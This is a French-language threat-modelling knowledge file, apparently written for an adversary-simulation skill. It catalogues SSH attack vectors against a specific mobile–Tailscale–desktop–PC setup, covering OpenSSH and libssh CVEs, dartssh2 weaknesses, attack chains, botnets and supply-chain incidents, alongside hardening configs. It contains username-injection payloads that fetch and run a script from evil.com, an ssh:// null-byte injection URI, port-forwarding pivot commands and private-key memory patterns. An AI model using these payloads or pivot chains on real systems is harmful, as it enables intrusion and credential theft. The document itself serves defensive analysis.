# Vecteurs d'Attaque SSH -- Base de connaissance offensive
# Skill : adversary-simulation | Fichier knowledge
# Architecture cible : Mobile (ChillShell) -> Tailscale mesh -> Desktop (Chill) -> SSH -> PC

> **Source** : Extractions de CYBERSEC_MOBILE.md et CYBERSEC_DESKTOP.md

---

## TABLE DES MATIERES

1. [CVEs OpenSSH critiques](#1--cves-openssh-critiques)
2. [CVEs libssh (impact indirect)](#2--cves-libssh-impact-indirect)
3. [dartssh2 -- surface d'attaque specifique](#3--dartssh2--surface-dattaque-specifique)
4. [Attaques du protocole SSH](#4--attaques-du-protocole-ssh)
5. [SSH Agent Forwarding Abuse](#5--ssh-agent-forwarding-abuse)
6. [SSH Tunneling et Port Forwarding Abuse](#6--ssh-tunneling-et-port-forwarding-abuse)
7. [Injection dans les commandes SSH](#7--injection-dans-les-commandes-ssh)
8. [Analyse de trafic SSH](#8--analyse-de-trafic-ssh)
9. [Attaques sur le stockage des cles SSH](#9--attaques-sur-le-stockage-des-cles-ssh)
10. [Fuzzing SSH assiste par IA](#10--fuzzing-ssh-assiste-par-ia)
11. [Chaines d'attaque combinees SSH](#11--chaines-dattaque-combinees-ssh)
12. [OpenSSH 10.x -- l'ere post-quantique et impact dartssh2](#12--openssh-10x--lere-post-quantique-et-impact-dartssh2)
13. [CVE-2025-32433 Erlang/OTP SSH -- RCE pre-auth CVSS 10.0](#13--cve-2025-32433-erlangotp-ssh--rce-pre-auth-cvss-100)
14. [8 CVEs libssh fevrier 2026 -- vague complete](#14--8-cves-libssh-fevrier-2026--vague-complete)
15. [Botnets SSH actifs 2025-2026](#15--botnets-ssh-actifs-2025-2026)
16. [Supply chain SSH](#16--supply-chain-ssh)
17. [Bonnes pratiques SSH 2026 et lacunes dartssh2](#17--bonnes-pratiques-ssh-2026-et-lacunes-dartssh2)

---

## 1 -- CVEs OpenSSH critiques

### 1.1 CVE-2024-6387 "regreSSHion" -- RCE root

- **Versions affectees** : OpenSSH 8.5p1 a 9.7p1
- **Complexite** : Nation-state
- **Description** : Race condition exploitant SIGALRM pendant la phase d'authentification. Permet une execution de code en tant que root sur le serveur SSH. Necessite des milliers de tentatives et un timing precis.
- **Impact** : Acces root complet au PC cible.
- **Pertinence ChillShell/Chill** : Le PC cible execute un serveur OpenSSH. Si la version est dans la plage affectee, un attaquant reseau peut obtenir un shell root.
- **Scenario d'attaque** :
  1. L'attaquant identifie la version d'OpenSSH du PC cible (banniere)
  2. Il envoie des milliers de tentatives d'authentification avec un timing precis
  3. La race condition SIGALRM permet l'execution de code dans le contexte root
  4. Shell root sur le PC cible

### 1.2 CVE-2025-26465 -- VerifyHostKeyDNS MITM

- **Versions affectees** : OpenSSH 6.8p1 a 9.9p1
- **Complexite** : Expert
- **Source** : Qualys, fevrier 2025
- **Description** : Erreur logique lors de la verification de cle d'hote via DNS SSHFP. Un attaquant en MITM force le client SSH a accepter une cle d'hote malveillante en provoquant une condition d'epuisement memoire (`SSH_ERR_ALLOC_FAIL`) dans `sshkey_from_private()`. En manipulant les codes d'erreur, le contournement se fait sans alerte utilisateur.
- **Impact** : Interception complete de la session SSH -- capture d'identifiants en clair, injection de commandes, manipulation de fichiers entre mobile et PC.
- **Pertinence dartssh2** : Si le systeme de verification d'hote delegue au DNS, le meme pattern est exploitable. Le risque existe si dartssh2 implemente un mecanisme similaire a VerifyHostKeyDNS.
- **Scenario d'attaque** :
  1. L'attaquant se positionne en MITM (ARP spoofing sur le LAN, ou compromission d'un relais DERP)
  2. Il presente sa propre cle d'hote au client
  3. Il manipule les reponses DNS SSHFP pour declencher l'epuisement memoire
  4. Le client accepte la cle malveillante sans alerter l'utilisateur
  5. L'attaquant intercepte tout le trafic SSH

### 1.3 CVE-2025-26466 -- DoS pre-authentification

- **Versions affectees** : OpenSSH 9.5p1 a 9.9p1
- **Complexite** : Script kiddie (tres facile a exploiter)
- **Description** : Exploitation de la gestion inefficace des paquets `SSH2_MSG_PING`. Le serveur alloue un paquet Pong en memoire qui n'est libere qu'apres l'echange de cles. Un attaquant sature le serveur de Ping **avant authentification**. La complexite de calcul quadratique O(n^2) lors de la reallocation fait exploser CPU et memoire.
- **Impact** : PC cible totalement sature, application bridge inoperante. Deni de service complet.
- **Scenario d'attaque** :
  1. L'attaquant envoie massivement des paquets SSH2_MSG_PING au serveur SSH
  2. Le serveur alloue de la memoire pour chaque Pong
  3. La complexite O(n^2) fait exploser la consommation CPU/RAM
  4. Le serveur SSH devient injoignable
  5. L'utilisateur ne peut plus controler son PC a distance

### 1.4 CVE-2025-61984 -- ProxyCommand RCE via injection username

- **Versions affectees** : OpenSSH <= 10.0p1
- **Complexite** : Expert
- **CVSS** : 8.1
- **Source** : cyberpress.org
- **Description** : Injection de caracteres de controle dans le nom d'utilisateur lors de la connexion SSH. Si l'application utilise `ProxyCommand` ou des expansions de sequences, ces caracteres sont interpretes par le shell du systeme, menant a une **execution de code arbitraire**. PoC publie pour Bash, fish, csh.
- **Impact** : Prise de controle totale du PC cible avec les privileges du service bridge.
- **Pertinence ChillShell/Chill** : Si le champ "username" dans l'app mobile n'est pas filtre et que la commande SSH est construite par concatenation, l'attaquant peut injecter des commandes shell.
- **Scenario d'attaque** :

```
# L'utilisateur entre ce username dans le champ de l'app mobile :
$(wget http://evil.com/backdoor.sh -O /tmp/b.sh && bash /tmp/b.sh)

# Si l'app construit la commande SSH par concatenation :
ssh $(wget http://evil.com/backdoor.sh -O /tmp/b.sh && bash /tmp/b.sh)@192.168.1.10

# Le shell interprete le $(...) et execute le code malveillant
```

### 1.5 Attaque Terrapin (CVE-2023-48795) -- Troncature de prefixe

- **Complexite** : Expert
- **Description** : Attaque par troncature de prefixe ciblant la couche de transport SSH. Exploite la phase de key exchange ou les numeros de sequence ne sont pas encore verifies cryptographiquement. Un MITM peut inserer ou supprimer des messages comme `EXT_INFO` (RFC 8308), desactivant :
  - L'obscurcissement du timing des frappes clavier
  - La negociation d'extensions de securite
  - Imposant des algorithmes plus faibles
- **Pertinence dartssh2 : CRITIQUE** : dartssh2 **DOIT** supporter l'extension "Strict KEX" (RFC 9308) qui reinitialise les numeros de sequence a la fin du key exchange. L'absence du support `kex-strict-c-v00@openssh.com` laisse la connexion vulnerable.
- **Scenario d'attaque** :
  1. L'attaquant se positionne en MITM entre le mobile et le desktop
  2. Pendant le key exchange, il supprime le message EXT_INFO du serveur
  3. Le client ne recoit jamais les extensions de securite
  4. L'attaquant peut maintenant analyser les patterns de trafic pour reconstruire les frappes

---

## 2 -- CVEs libssh (impact indirect)

Ces CVEs concernent libssh (C), pas dartssh2 directement. Mais les **patterns d'erreur sont transposables** a dartssh2 qui implemente les memes primitives.

### 2.1 CVE-2025-5372 -- Mismatch semantique OpenSSL

- **Severite** : Haute
- **Versions** : libssh < 0.11.4
- **Description** : Decalage de contrat d'API entre libssh et OpenSSL. OpenSSL utilise 0 pour erreur, libssh traite 0 comme succes dans `ssh_kdf()`. Quand OpenSSL echoue a generer du materiel de cle, libssh **procede avec des tampons memoire non initialises**.
- **Impact** : Cles cryptographiques vides ou imprevisibles. Interception, manipulation de sessions, DoS.
- **Pertinence dartssh2** : Pattern d'erreur analogue possible. dartssh2 utilise pointycastle/cryptography -- verifier la gestion des codes retour dans TOUTES les routines de derivation de cles.

### 2.2 CVE-2025-14821 -- Chemin de config Windows (C:\etc)

- **Versions** : libssh sur Windows
- **Description** : libssh cherche ses fichiers de configuration dans `C:\etc`, chemin souvent accessible en ecriture. Un attaquant local modifie les hotes de confiance ou degrade les parametres SSH.
- **Pertinence Chill Desktop** : Si le desktop Windows utilise libssh, ce chemin est directement exploitable.

### 2.3 CVE-2026-0964 -- Traversee de chemin SCP

- **Description** : Faille dans `ssh_scp_pull_request` permettant une traversee de chemin lors des transferts SCP.
- **Impact** : Lecture/ecriture de fichiers arbitraires sur le PC.

### 2.4 CVE-2026-0966 -- Sous-depassement de tampon

- **Description** : Sous-depassement de tampon dans libssh. Pattern transposable a dartssh2.

### 2.5 CVE-2026-0968 -- Lecture hors limites SFTP

- **Description** : Lecture hors limites dans les operations SFTP de libssh. dartssh2 implemente aussi SFTP -- meme classe de vulnerabilite possible.

---

## 3 -- dartssh2 -- surface d'attaque specifique

### 3.1 Aucun audit de securite

- **Criticite** : CRITIQUE
- dartssh2 est une implementation SSH pure Dart -- PAS un wrapper OpenSSH
- 229 stars, 67 forks sur GitHub
- **Aucun audit de securite publie**
- Issue #86 rapporte des crashes transport

### 3.2 Risques identifies

| Risque | Description | CWE |
|--------|-------------|-----|
| Machine d'etat SSH | Interruptions mal gerees durant le handshake, injection de paquets hors sequence | CWE-362 |
| Rogue Extension Negotiation | Similaire aux failles AsyncSSH | CWE-20 |
| Dependances transitives | pointycastle + pinenacl -- vulnerabilites transitives | CWE-1395 |
| Strict KEX non verifie | Support du RFC 9308 non confirme | CWE-354 |
| Pas de rekey automatique | Meme cle de session pour toute la connexion | CWE-324 |
| Channel multiplexing | Injection de donnees inter-canaux possible | CWE-20 |

### 3.3 Banniere SSH (Fingerprinting)

- **Complexite** : Script kiddie (trivial)
- La banniere SSH de dartssh2 revele que c'est une app Flutter, pas un client SSH standard
- Un attaquant identifie immediatement la stack technique
- `nmap -sV -p 22 <IP>` pour lire la banniere

### 3.4 Surface d'attaque amplifiee cote Desktop

L'app desktop fait office de **SERVEUR** (recoit des connexions du mobile via Tailscale). Surface d'attaque amplifiee par rapport au mobile (client uniquement).

---

## 4 -- Attaques du protocole SSH

### 4.1 SSH Protocol Downgrade Attack

- **Complexite** : Intermediaire
- **Description** : Forcer le client ou le serveur a utiliser des algorithmes plus faibles.
- **Algorithmes dangereux a chercher dans dartssh2** :
  - `diffie-hellman-group1-sha1` (DH 1024 bits -- cassable)
  - `ssh-rsa` avec SHA1 (collisions connues)
  - `arcfour` / RC4 (biaises statistiques)
  - `3des-cbc` (taille de bloc 64 bits -- Sweet32)
  - `hmac-sha1-96` (tronque)
- **Algorithmes surs a IMPOSER** :
  - KEX : `curve25519-sha256`
  - Chiffrement : `aes256-gcm@openssh.com`
  - MAC : `hmac-sha2-512`
  - Host key : `ssh-ed25519`
- **Scenario d'attaque** :
  1. Le MITM intercepte le message KEXINIT du client
  2. Il modifie la liste des algorithmes supportes
  3. Le serveur accepte un algorithme cassable
  4. L'attaquant peut dechiffrer le trafic

### 4.2 SSH Session Hijacking

- **Complexite** : Expert
- MITM sur le tunnel Tailscale ou le reseau local
- Outils : `ssh-mitm` (specialise), ARP spoofing sur LAN

### 4.3 SSH Replay Attack

- **Complexite** : Intermediaire
- Capture du trafic SSH et replay des commandes
- Si dartssh2 n'implemente pas le rekey, la meme cle sert pour toute la session
- Si les numeros de sequence ne sont pas correctement valides, le replay est possible

---

## 5 -- SSH Agent Forwarding Abuse

- **Cible** : Desktop (Chill app)
- **Complexite** : Intermediaire
- Si l'app utilise l'agent forwarding SSH, un serveur compromis peut utiliser l'agent pour se connecter a d'autres machines

```
[Mobile] --SSH--> [Desktop Bridge (compromis)] --Agent Forward--> [Serveur A]
                                                                  [Serveur B]
                                                                  [Serveur C]
```

Ce que l'attaquant peut faire :
- Se connecter a d'autres serveurs sans connaitre les cles
- Signer des operations cryptographiques
- Rebondir vers des machines inaccessibles directement
- Maintenir la persistance tant que la session agent est active

---

## 6 -- SSH Tunneling et Port Forwarding Abuse

### Types de tunneling exploitables

**Local Port Forwarding** :
```bash
# L'attaquant utilise le desktop comme proxy vers le LAN
ssh -L 8080:192.168.1.1:80 user@desktop-bridge
```

**Remote Port Forwarding (tunnel inverse)** :
```bash
# Le serveur compromis demande au client d'ouvrir un port
ssh -R 4444:localhost:22 user@desktop-bridge
```

**Dynamic Port Forwarding (SOCKS proxy)** :
```bash
# Le desktop bridge devient un proxy SOCKS complet
ssh -D 1080 user@desktop-bridge
```

### Trust Relationship Abuse

Le flux `Mobile -> Tailscale -> Desktop Bridge -> PC cible` cree une chaine de confiance exploitable :
1. L'attaquant compromet le mobile ou obtient acces au tailnet
2. Connexion SSH au desktop bridge
3. Activation du port forwarding pour pivoter vers le LAN
4. Acces au routeur, NAS, autres machines, imprimantes, cameras

### Configuration sshd_config durcie (reference)

```
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
AllowUsers <username>
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no
PermitTunnel no
ClientAliveInterval 300
ClientAliveCountMax 2
MaxSessions 2
LogLevel VERBOSE
```

---

## 7 -- Injection dans les commandes SSH

### 7.1 Command Injection via concatenation

- **Reference** : OWASP A03:2021
- Construction de commandes SSH par concatenation de chaines

```dart
// CODE VULNERABLE -- concatenation de chaines
final command = 'ssh $username@$host';
Process.run('/bin/sh', ['-c', command]);  // DANGER

// L'attaquant entre comme username :
// admin; wget http://evil.com/backdoor -O /tmp/b && bash /tmp/b
```

### 7.2 Configuration manipulation via l'app Desktop

L'app desktop configure l'OS (sshd_config, pare-feu, WOL, fast boot). Si un attaquant intercepte les parametres de configuration :
- Modification de `sshd_config` : activer root login, ajouter cle attaquant
- Modification des regles firewall : ouvrir des ports supplementaires
- Desactivation du hardening OS

L'app a souvent des **privileges eleves** (admin/root) pour configurer l'OS -- l'impact est amplifie.

---

## 8 -- Analyse de trafic SSH

### 8.1 Keepalive Timing Analysis

- **Complexite** : Expert
- Les keepalive SSH trahissent la presence d'une session active
- Les patterns de trafic chiffre revelent :
  - La taille du paquet -> type de commande
  - La frequence des paquets -> rythme de frappe
  - Les patterns de reponse -> interactif vs transfert de fichier

### 8.2 Traffic Timing Analysis par IA

- En 2026, l'IA correle les micro-variations de latence sur 5G-Advanced
- Techniques de Deep Learning pour reconstruire les frappes clavier
- Correlation taille des paquets + intervalles inter-paquets + profils de frappe individuels

---

## 9 -- Attaques sur le stockage des cles SSH

### 9.1 Extraction via flutter_secure_storage (Mobile)

Sur device roote/jailbreake :
- Acces direct a `/data/data/<package>/` (Android)
- Hooks Frida sur Keystore pour intercepter les operations de dechiffrement
- RAM dump pour capturer les cles en clair

### 9.2 Secrets dans le heap Dart

- Le GC Dart peut copier les objets (dont les cles privees) dans differentes zones de la heap
- Une cle en `String` Dart persiste indefiniment en memoire
- Motifs a chercher en memoire :
  - `-----BEGIN RSA PRIVATE KEY-----`
  - `-----BEGIN OPENSSH PRIVATE KEY-----`
  - `-----BEGIN EC PRIVATE KEY-----`

### 9.3 Stockage desktop -- PAS de Secure Enclave

- Windows : Credential Manager via Platform Channels
- Linux : libsecret (GNOME Keyring)
- macOS : Keychain
- L'absence de sandbox signifie qu'une compromission de n'importe quel processus donne acces a toutes les cles

### 9.4 Backup Extraction

- Android : ADB backup, Google Drive (si `allowBackup: true`)
- iOS : iTunes, iCloud
- Desktop : Time Machine, Windows Backup, rsync/timeshift

---

## 10 -- Fuzzing SSH assiste par IA

### Outils de fuzzing IA contre dartssh2

| Outil | Methode |
|-------|---------|
| TitanFuzz | Generation de payloads par LLM, conscient du protocole |
| FuzzGPT | Analyse du code source pour cibler les branches inexplorees |
| ChatAFL | Fuzzing assiste par chat pour protocoles reseau |
| Xbow | Surpasse les chercheurs humains sur les plateformes de bug bounty |

### Points chauds pour le fuzzing de dartssh2

- Handshake SSH (echange de cles, negociation d'algorithmes)
- Messages hors sequence pendant l'authentification
- Paquets avec des tailles invalides
- Nonces/IVs dupliques
- Operations SFTP avec des chemins malformes
- Channel multiplexing avec des IDs conflictuels
- Messages apres fermeture de session

---

## 11 -- Chaines d'attaque combinees SSH

### Chaine 1 : Intrusion complete via dartssh2

```
Banner Fingerprinting (identifier dartssh2)
  -> Downgrade Attack (forcer algorithme faible)
  -> MITM (intercepter la session SSH)
  -> Capture des credentials (username + cle privee)
  -> Acces permanent au PC cible
```

### Chaine 2 : Pivot lateral via le desktop bridge

```
Compromission du mobile (malware, phishing, Frida)
  -> Extraction des cles SSH (flutter_secure_storage + RAM dump)
  -> Connexion au desktop bridge via Tailscale
  -> SSH Tunneling Abuse (port forwarding)
  -> Pivot vers tout le LAN (routeur, NAS, autres PCs)
  -> Persistance (ajout de cle SSH attaquant dans authorized_keys)
```

### Chaine 3 : Exploitation de la configuration OS

```
MITM ou compromission du canal mobile -> desktop
  -> Injection dans les parametres de configuration
  -> Le desktop applique la config malveillante avec privileges root :
     - PermitRootLogin yes
     - PasswordAuthentication yes
     - AllowTcpForwarding yes
     - Pare-feu desactive
  -> L'attaquant se connecte directement au PC en root
  -> Controle total de la machine
```

### Chaine 4 : Terrapin + regreSSHion

```
MITM via Tailscale DERP compromis ou ARP spoofing LAN
  -> Attaque Terrapin (CVE-2023-48795) : supprimer EXT_INFO
  -> Desactivation des protections de securite
  -> Exploitation de regreSSHion (CVE-2024-6387) contre le serveur
  -> Shell root sur le PC cible
```

### Chaine 5 : Supply chain + persistance SSH

```
Compromission d'une dependance pub.dev (dartssh2, cryptography)
  -> Typosquatting : dartssh3, flutter_securre_storage
  -> Le code malveillant exfiltre les cles SSH
  -> Ajoute un algorithme faible dans la negociation KEX
  -> Desactive la verification des cles d'hote
  -> Acces permanent a tous les PCs configures avec l'app
```

---

## 12 -- OpenSSH 10.x -- l'ere post-quantique et impact dartssh2

### 12.1 Chronologie OpenSSH (9.9p2 a 10.2)

| Version | Date | Changements majeurs |
|---------|------|---------------------|
| 9.9p2 | 18 fev. 2025 | Corrige CVE-2025-26465 (MitM VerifyHostKeyDNS) et CVE-2025-26466 (DoS pre-auth SSH2_MSG_PING) |
| **10.0** | 9 avr. 2025 | **mlkem768x25519-sha256 devient le KEX par defaut** ; suppression DSA ; separation sshd-auth ; CVE-2025-32728 |
| **10.1** | 6 oct. 2025 | CVE-2025-61984/61985 (injection ProxyCommand) ; **WarnWeakCrypto pour KEX non-PQ** |
| 10.2 | 10 oct. 2025 | Correctifs de bugs (ControlPersist, PKCS#11) |

### 12.2 Impact CRITIQUE sur dartssh2

- **dartssh2 NE supporte PAS** `mlkem768x25519-sha256` ni `sntrup761x25519-sha512`
- La negociation retombe sur `curve25519-sha256` (classique) -- sans protection "harvest now, decrypt later"
- **OpenSSH 10.1 emet des avertissements** pour les KEX non-PQ -> les serveurs logueront des warnings a chaque connexion de notre app
- dartssh2 a encore `diffie-hellman-group1-sha1` et `rsa1024-sha1` disponibles sans mecanisme de desactivation par defaut
- Le desktop bridge est SIMULTANEMENT client SSH (vers le PC) et point de terminaison Tailscale (depuis le mobile) -- les deux segments doivent etre securises

### 12.3 CVE-2025-61985 -- Caractere nul dans URIs ssh://

- **CVSS** : 3.6 | **Date** : 6 octobre 2025
- **Description** : Le caractere `\0` autorise dans les URIs `ssh://` -> execution de code via ProxyCommand
- **Pertinence ChillShell/Chill** : Les deep links de type `ssh://user@host` que l'app pourrait parser sont concernes. Rejeter tout caractere nul ou de controle dans les URIs SSH
- **Scenario d'attaque** :
  1. L'attaquant forge un deep link `ssh://user%00;malicious_cmd@host`
  2. L'app mobile recoit le deep link et le parse
  3. Le caractere nul permet d'injecter du code dans le traitement de l'URI
  4. Si l'URI est transmise a un processus SSH natif, execution de code arbitraire

### 12.4 CVE-2025-32728 -- Contournement DisableForwarding

- **Date** : Avril 2025 | Corrige dans OpenSSH 10.0
- **Description** : `DisableForwarding` ne desactivait PAS le forwarding X11 et agent
- **Pertinence ChillShell/Chill** : Si le serveur SSH cible utilise cette directive comme protection de bastion, le forwarding X11 et agent restait actif. Le desktop bridge pouvait etre utilise comme pivot
- **Scenario d'attaque** :
  1. L'admin configure `DisableForwarding yes` sur le sshd du PC cible
  2. L'attaquant exploite le fait que X11 et agent forwarding ne sont PAS desactives
  3. L'agent SSH du desktop bridge est accessible depuis le serveur
  4. Pivot vers d'autres machines via l'agent SSH

---

## 13 -- CVE-2025-32433 Erlang/OTP SSH -- RCE pre-auth CVSS 10.0

### 13.1 Description

- **Type** : RCE pre-authentification | **CVSS** : 10.0 (MAXIMUM)
- **Statut** : ACTIVEMENT EXPLOITEE -- catalogue CISA KEV depuis le 9 juin 2025
- **Description** : Le demon SSH Erlang ne rejetait pas les messages SSH >= 80 (post-authentification RFC 4252) avant l'authentification. Un attaquant envoie `SSH_MSG_CHANNEL_REQUEST` sans s'authentifier -> execution de code arbitraire. Si le demon tourne en root, compromission totale.
- **Exploitation** : Confirmee en conditions reelles par Palo Alto Unit42. 70% des detections ciblent des pare-feu OT/ICS. Module Metasploit disponible.
- **Fait marquant** : Le PoC public a ete **genere avec ChatGPT et Cursor** -- preuve de l'acceleration IA dans la creation d'exploits.
- **Produits impactes** : Cisco, NetApp, RabbitMQ, Apache CouchDB, Nerves IoT, infrastructure telecom

### 13.2 Pertinence ChillShell/Chill

- dartssh2 est un client SSH, PAS un serveur Erlang -> pas directement vulnerable
- **MAIS** : Si l'infrastructure reseau locale utilise RabbitMQ, CouchDB, ou tout serveur Erlang/OTP SSH, ces serveurs sont compromis a distance SANS authentification
- Les serveurs Erlang/OTP SSH exposes sur le meme reseau que le PC cible sont des vecteurs d'entree laterale

### 13.3 Scenario d'attaque

```
1. L'attaquant identifie un service Erlang/OTP SSH sur le reseau (RabbitMQ, CouchDB)
2. Il envoie SSH_MSG_CHANNEL_REQUEST sans authentification
3. Execution de code en tant que root sur le serveur Erlang
4. Depuis ce serveur compromis, pivot vers le PC cible via SSH
5. Installation de persistance sur le reseau local
```

---

## 14 -- 8 CVEs libssh fevrier 2026 -- vague complete

Ces CVEs completent celles de la section 2. Elles couvrent la vague de fevrier 2026 et libssh 0.12.0.

### 14.1 Tableau complet des 8 CVEs

| CVE | Severite | Description | Corrigee dans |
|-----|----------|-------------|---------------|
| **CVE-2025-5318** | Moyenne (5.4) | Lecture hors limites `sftp_handle()` -- pointeur invalide | 0.11.2 |
| **CVE-2025-5372** | Moyenne | Cles crypto non initialisees avec OpenSSL < 3.0 | 0.11.2 |
| **CVE-2025-14821** | -- | Chargement config depuis `C:\etc` (Windows inscriptible) | 0.11.4 / 0.12.0 |
| **CVE-2026-0964** | -- | Path traversal SCP | 0.11.4 / 0.12.0 |
| **CVE-2026-0965** | -- | DoS par fichiers config inattendus | 0.11.4 / 0.12.0 |
| **CVE-2026-0966** | -- | Buffer underflow `ssh_get_hexa()` | 0.11.4 / 0.12.0 |
| **CVE-2026-0967** | -- | DoS par regex inefficace | 0.11.4 / 0.12.0 |
| **CVE-2026-0968** | -- | Lecture hors limites `sftp_parse_longname()` | 0.11.4 / 0.12.0 |

### 14.2 libssh 0.12.0 (10 fevrier 2026)

- Support KEX post-quantique
- Support FIDO2
- Support sshsig
- Corrige l'ensemble des 8 CVEs

### 14.3 Pertinence dartssh2

- dartssh2 est independant de libssh (pur Dart). Ces CVEs ne l'affectent PAS directement.
- **MAIS** : Elles illustrent les classes de bugs recurrentes auxquelles dartssh2 pourrait etre vulnerable SANS audit formel :
  - Lecture hors limites SFTP (CVE-2025-5318, CVE-2026-0968) -> dartssh2 implemente aussi SFTP
  - Buffer underflow (CVE-2026-0966) -> verifier le parsing binaire de dartssh2
  - Path traversal SCP (CVE-2026-0964) -> toute fonction de transfert de fichier
  - Cles crypto non initialisees (CVE-2025-5372) -> gestion des erreurs de derivation de cles dans pointycastle
  - DoS par regex (CVE-2026-0967) -> verifier les expressions regulieres dans le parsing SSH
  - Config depuis chemin inscriptible (CVE-2025-14821) -> specifique au desktop Windows

---

## 15 -- Botnets SSH actifs 2025-2026

### 15.1 SSHStalker (fevrier 2026)

- **Cibles** : ~7 000 systemes Linux (USA, Europe, Asie-Pacifique)
- **Technique** : Scanner Go deguise en nmap -> telecharge GCC sur la victime -> compile le malware sur place ("living off the land") -> cron watchdog toutes les minutes -> 16 exploits kernel Linux (2009-2010)
- **Objectifs** : Minage Ethereum Classic + vol credentials AWS
- **Pertinence ChillShell/Chill** : Si le PC cible tourne Linux avec SSH expose (meme via Tailscale), SSHStalker peut le cibler. Le desktop bridge Linux est egalement une cible directe.
- **Scenario d'attaque** :
  1. SSHStalker scanne le reseau et trouve le PC cible (port 22)
  2. Brute-force ou exploitation de credentials faibles
  3. Telecharge GCC et compile le malware sur place (pas de binaire pre-compile a detecter)
  4. Installe un cron watchdog qui redemarre le malware toutes les minutes
  5. Vol des credentials SSH/AWS stockes sur la machine
  6. Les cles SSH utilisees par l'app Chill sont compromises

### 15.2 AyySSHush (mai 2025)

- **Cibles** : 9 000+ routeurs ASUS
- **Technique** : Injection de cles SSH publiques + activation SSH sur port 53282
- **Persistance** : **Survit aux mises a jour firmware** car elle utilise les parametres legitimes ASUS
- **Pertinence ChillShell/Chill** : Si le reseau local utilise des routeurs ASUS, ils sont potentiellement compromis. L'attaquant a un acces SSH au reseau local et peut intercepter ou manipuler le trafic.
- **Scenario d'attaque** :
  1. Le routeur ASUS du reseau local est compromis par AyySSHush
  2. L'attaquant a un acces SSH permanent au routeur (port 53282)
  3. Il peut observer tout le trafic LAN (ARP spoofing, DNS poisoning)
  4. Il intercepte les connexions entre le desktop bridge et le PC cible
  5. Meme apres mise a jour firmware, la persistance via parametres ASUS subsiste

### 15.3 PumaBot (mai 2025)

- **Type** : Botnet Go ciblant l'IoT Linux via brute-force SSH
- **Particularite** : Detection de honeypots (evite les pieges de securite), deploiement de mineurs XMRig
- **Pertinence ChillShell/Chill** : Les PC Linux avec des mots de passe SSH faibles sont des cibles directes. Si le PC cible utilise l'authentification par mot de passe au lieu de cles, PumaBot peut le compromettre.

### 15.4 Impact combine des botnets

- L'app mobile initie des connexions SSH via dartssh2 -> si le serveur cible est compromis par un botnet, les credentials envoyes sont interceptes
- Le desktop bridge Linux est lui-meme une cible de SSHStalker
- Le routeur local (AyySSHush) peut servir de point d'interception MITM

---

## 16 -- Supply chain SSH

### 16.1 GhostAction (septembre 2025)

- A compromis **817 depots GitHub** et exfiltre **3 325 secrets incluant des cles SSH**
- **Pertinence ChillShell/Chill** : Si les cles SSH ou configs du projet sont stockees dans un depot GitHub, verifier qu'il n'a pas ete touche par GhostAction
- **Scenario d'attaque** :
  1. Un depot GitHub du projet est compromis par GhostAction
  2. Les cles SSH du desktop bridge sont exfiltrees
  3. L'attaquant utilise ces cles pour se connecter au PC cible
  4. Persistance via ajout de sa propre cle dans authorized_keys

### 16.2 Module Go malveillant exfiltrant vers Telegram

- **Nom** : `golang-random-ip-ssh-bruteforce`
- Se faisait passer pour un outil de test SSH
- En realite, exfiltrait les credentials reussis vers un bot Telegram russe (`@sshZXC_bot`)
- **Pertinence** : Si le poste developpeur avait ce module, les credentials SSH du desktop sont compromis

### 16.3 Images Docker avec backdoor XZ Utils

- Images Docker Debian contenant le **backdoor XZ Utils** trouvees sur Docker Hub en aout 2025
- **Pertinence ChillShell/Chill** : Si le PC cible utilise Docker avec des images Debian non verifiees, la liblzma backdooree peut compromettre SSH
- La backdoor XZ est specifiquement concue pour compromettre sshd

---

## 17 -- Bonnes pratiques SSH 2026 et lacunes dartssh2

### 17.1 Algorithmes recommandes (ssh-audit.com, avril 2025)

**KEX** (ordre de priorite) :
1. `sntrup761x25519-sha512@openssh.com` (PQ hybride)
2. `mlkem768x25519-sha256` (PQ hybride, defaut OpenSSH 10.0)
3. `curve25519-sha256` (classique, seul supporte par dartssh2)
4. `diffie-hellman-group18-sha512`
5. `diffie-hellman-group16-sha512`

**Chiffrement** : `chacha20-poly1305@openssh.com` -> `aes256-gcm@openssh.com` -> `aes256-ctr`

**MACs** : Exclusivement ETM (`hmac-sha2-512-etm`, `hmac-sha2-256-etm`, `umac-128-etm`)

**Cles hote** : `ssh-ed25519` prioritaire, `rsa-sha2-512` avec minimum 3072 bits

### 17.2 Evolutions IETF en cours

- **Draft ML-KEM SSH** (`draft-ietf-sshm-mlkem-hybrid-kex-09`) : En **IETF Last Call** (fevrier 2026) -- standardisation imminente
- **Draft ML-DSA SSH** (`draft-rpe-ssh-mldsa-02`) : Signatures post-quantiques pour SSH
- **Draft Strict KEX** (`draft-miller-sshm-strict-kex-01`) : Formalisation en cours

### 17.3 Ce que dartssh2 devrait supporter mais ne supporte PAS

| Fonctionnalite manquante | Impact | Risque |
|--------------------------|--------|--------|
| KEX post-quantique (mlkem768x25519-sha256 ou sntrup761x25519-sha512) | Aucune protection "harvest now, decrypt later" | Haute |
| Strict KEX (RFC 9308) | Vulnerable a Terrapin (CVE-2023-48795) | Haute |
| Desactivation par defaut des algorithmes faibles (DH group1, RSA 1024) | Downgrade attack possible | Haute |
| WarnWeakCrypto cote client | L'utilisateur n'est pas averti qu'il utilise des algorithmes obsoletes | Moyenne |
| Rekey automatique | Meme cle de session pour toute la connexion | Moyenne |

### 17.4 Configuration dartssh2 recommandee

```dart
// Configuration securisee dartssh2 (a appliquer cote ChillShell/Chill)
// KEX : N'accepter que curve25519-sha256 (meilleur classique disponible)
// Cipher : aes256-gcm@openssh.com (immunise Terrapin)
// MAC : hmac-sha2-256-etm@openssh.com
// Cle hote : ssh-ed25519 uniquement
// INTERDIRE : disableHostkeyVerification
```

### 17.5 sshd_config recommande pour le PC cible

```
# Algorithmes (post-quantique si supporte)
KexAlgorithms sntrup761x25519-sha512@openssh.com,mlkem768x25519-sha256,curve25519-sha256
Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512

# Durcissement
RequiredRSASize 3072
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
AllowUsers <user_specifique>

# Re-keying
RekeyLimit 1G 1h
```

---

## REFERENCES

### CVEs OpenSSH
- CVE-2024-6387 "regreSSHion" : OpenSSH 8.5p1-9.7p1, RCE root, race condition SIGALRM
- CVE-2025-26465 : OpenSSH 6.8p1-9.9p1, MITM via VerifyHostKeyDNS, Qualys fev. 2025
